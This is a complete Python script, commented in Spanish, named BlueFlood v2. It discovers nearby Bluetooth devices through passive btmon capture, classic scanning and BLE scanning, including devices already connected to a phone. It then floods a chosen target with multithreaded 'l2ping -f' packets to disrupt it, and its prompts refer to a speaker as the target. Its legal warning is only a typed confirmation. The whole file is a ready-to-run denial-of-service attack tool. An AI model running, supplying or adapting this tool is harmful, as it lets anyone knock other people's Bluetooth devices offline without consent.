#!/usr/bin/env python3
"""
blueflood_v2.py - BlueFlood con descubrimiento automático de MAC
Incluye modo pasivo para encontrar dispositivos aunque estén conectados.
"""

import subprocess
import argparse
import time
import threading
import sys
import os
import re
import signal

def check_dependencies():
    """Verifica herramientas necesarias"""
    missing = []
    for cmd in ['l2ping', 'hcitool', 'btmon']:
        if subprocess.call(['which', cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
            missing.append(cmd)
    if missing:
        print(f"[!] Faltan: {', '.join(missing)}")
        print("[*] Instala con: sudo apt install bluez bluez-utils")
        sys.exit(1)
    print("[+] Dependencias OK")

def show_disclaimer():
    """Aviso de uso responsable"""
    os.system('clear')
    print("=" * 60)
    print("  BlueFlood v2 - Auditoría Bluetooth con Descubrimiento Pasivo")
    print("=" * 60)
    print("\n[!] ADVERTENCIA LEGAL:")
    print("    Solo usar contra DISPOSITIVOS PROPIOS")
    print("    en ENTORNOS AISLADOS de laboratorio.")
    print("=" * 60)
    response = input("\n¿Confirmas? (s/n): ")
    if response.lower() != 's':
        print("[*] Cancelado.")
        sys.exit(0)
    os.system('clear')

def passive_scan_btmon(duration=15):
    """
    Captura tráfico Bluetooth pasivamente con btmon.
    Detecta dispositivos activos incluso si no están en modo visible.
    """
    print(f"[*] Iniciando captura pasiva con btmon ({duration}s)...")
    print("[*] Este método detecta dispositivos aunque estén conectados.\n")

    # Archivo temporal para la captura
    logfile = "/tmp/blueflood_btmon.log"

    # Iniciar btmon en segundo plano
    btmon = subprocess.Popen(
        ['btmon', '-w', logfile],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    time.sleep(1)

    # Forzar escaneo para generar tráfico
    subprocess.run(['hcitool', 'scan', '--flush'], timeout=duration,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(2)
    btmon.terminate()
    btmon.wait()

    # Analizar la captura en busca de direcciones MAC
    macs_found = set()
    try:
        with open(logfile, 'r', errors='ignore') as f:
            content = f.read()
            # Buscar patrones de MAC Bluetooth
            pattern = r'([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2})'
            matches = re.findall(pattern, content)
            for mac in matches:
                macs_found.add(mac.upper())
    except Exception as e:
        print(f"[!] Error analizando captura: {e}")

    os.remove(logfile) if os.path.exists(logfile) else None

    return list(macs_found)

def active_scan_classic(duration=8):
    """Escaneo Bluetooth clásico (solo dispositivos visibles)"""
    print(f"[*] Escaneo clásico ({duration}s)...")
    devices = []
    try:
        result = subprocess.run(
            ['hcitool', 'scan', '--flush'],
            timeout=duration,
            capture_output=True,
            text=True
        )
        for line in result.stdout.split('\n'):
            if '\t' in line:
                parts = line.strip().split('\t')
                if len(parts) >= 2:
                    devices.append({'mac': parts[0].strip().upper(), 'name': parts[1].strip()})
    except subprocess.TimeoutExpired:
        pass
    return devices

def active_scan_ble(duration=8):
    """Escaneo BLE (dispositivos Low Energy, a menudo visibles)"""
    print(f"[*] Escaneo BLE ({duration}s)...")
    devices = []
    try:
        result = subprocess.run(
            ['hcitool', 'lescan', '--passive'],
            timeout=duration,
            capture_output=True,
            text=True
        )
        for line in result.stdout.split('\n'):
            if '\t' in line or ' ' in line:
                parts = line.strip().split()
                if len(parts) >= 2:
                    mac_candidate = parts[0].upper()
                    if re.match(r'^[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}$', mac_candidate):
                        devices.append({'mac': mac_candidate, 'name': ' '.join(parts[1:])})
    except subprocess.TimeoutExpired:
        pass
    return devices

def discover_all_devices():
    """
    Combina todas las técnicas de descubrimiento para encontrar
    dispositivos Bluetooth, incluso si están conectados.
    """
    print("=" * 60)
    print("  FASE 1: DESCUBRIMIENTO COMBINADO DE DISPOSITIVOS")
    print("=" * 60 + "\n")

    all_macs = {}  # Diccionario para deduplicar: {mac: info}

    # Técnica 1: Captura pasiva (la más potente, detecta conexiones activas)
    print("[1/3] Captura pasiva con btmon...")
    passive_macs = passive_scan_btmon(duration=12)
    for mac in passive_macs:
        all_macs[mac] = {'name': '(detectado pasivamente)', 'method': 'btmon'}
    print(f"       Encontrados: {len(passive_macs)} dispositivos")

    # Técnica 2: Escaneo clásico
    print("\n[2/3] Escaneo clásico...")
    classic_devs = active_scan_classic(duration=8)
    for dev in classic_devs:
        if dev['mac'] not in all_macs:
            all_macs[dev['mac']] = {'name': dev['name'], 'method': 'scan clásico'}
    print(f"       Encontrados: {len(classic_devs)} dispositivos")

    # Técnica 3: Escaneo BLE
    print("\n[3/3] Escaneo BLE...")
    ble_devs = active_scan_ble(duration=8)
    for dev in ble_devs:
        if dev['mac'] not in all_macs:
            all_macs[dev['mac']] = {'name': dev['name'], 'method': 'BLE'}
    print(f"       Encontrados: {len(ble_devs)} dispositivos")

    print(f"\n[*] Total único de dispositivos: {len(all_macs)}")
    return all_macs

def l2ping_flood(mac, packet_size=600):
    """Hilo de inundación L2CAP"""
    cmd = ['l2ping', '-s', str(packet_size), '-f', mac]
    while True:
        try:
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
        except (subprocess.TimeoutExpired, Exception):
            pass

def launch_attack(mac, threads=4, packet_size=600, duration=60):
    """Lanza ataque multifilar"""
    print(f"\n[!] INICIANDO ATAQUE L2CAP")
    print(f"    Objetivo: {mac}")
    print(f"    Hilos: {threads}")
    print(f"    Paquete: {packet_size} bytes")
    print(f"    Duración: {duration}s\n")

    for i in range(threads):
        t = threading.Thread(target=l2ping_flood, args=(mac, packet_size), daemon=True)
        t.start()
        print(f"    [+] Hilo {i+1} lanzado")

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print("\n[!] Detenido manualmente.")
    finally:
        print("[*] Ataque finalizado.\n")
        sys.exit(0)

def main():
    parser = argparse.ArgumentParser(
        description='BlueFlood v2 - Ataque L2CAP con descubrimiento automático',
        epilog='Ejemplo: sudo python3 blueflood_v2.py'
    )
    parser.add_argument('--mac', '-m', help='MAC del objetivo (si la conoces)')
    parser.add_argument('--threads', '-t', type=int, default=4, help='Hilos de ataque')
    parser.add_argument('--size', '-s', type=int, default=600, help='Tamaño de paquete')
    parser.add_argument('--duration', '-d', type=int, default=60, help='Duración (segundos)')
    parser.add_argument('--discover-only', action='store_true', help='Solo descubrir dispositivos, sin atacar')

    args = parser.parse_args()

    check_dependencies()
    show_disclaimer()

    if os.geteuid() != 0:
        print("[!] Necesitas permisos de superusuario: sudo python3 blueflood_v2.py")
        sys.exit(1)

    if args.mac:
        target_mac = args.mac.upper()
        print(f"[*] MAC proporcionada: {target_mac}")
    else:
        devices = discover_all_devices()

        if not devices:
            print("\n[!] No se encontró ningún dispositivo Bluetooth.")
            print("[*] Consejos:")
            print("    - Activa el Bluetooth del portátil: sudo rfkill unblock bluetooth")
            print("    - Asegúrate de que el altavoz está encendido y cerca")
            print("    - Si el altavoz está conectado al móvil, pulsa su botón BT 3s")
            sys.exit(1)

        print("\n" + "=" * 60)
        print("  DISPOSITIVOS ENCONTRADOS:")
        print("=" * 60)
        device_list = list(devices.items())
        for i, (mac, info) in enumerate(device_list):
            print(f"  {i+1}. {mac} - {info['name']} [{info['method']}]")

        if args.discover_only:
            print("\n[*] Modo solo descubrimiento. Saliendo.")
            sys.exit(0)

        try:
            choice = int(input("\nSelecciona el número del altavoz objetivo: ")) - 1
            target_mac = device_list[choice][0]
        except (ValueError, IndexError):
            print("[!] Selección inválida.")
            sys.exit(1)

    print(f"\n[!] ATENCIÓN: Se atacará {target_mac}")
    confirm = input("¿Estás COMPLETAMENTE seguro? (escribe 'SI'): ")
    if confirm != 'SI':
        print("[*] Cancelado.")
        sys.exit(0)

    launch_attack(target_mac, args.threads, args.size, args.duration)

if __name__ == '__main__':
    main()
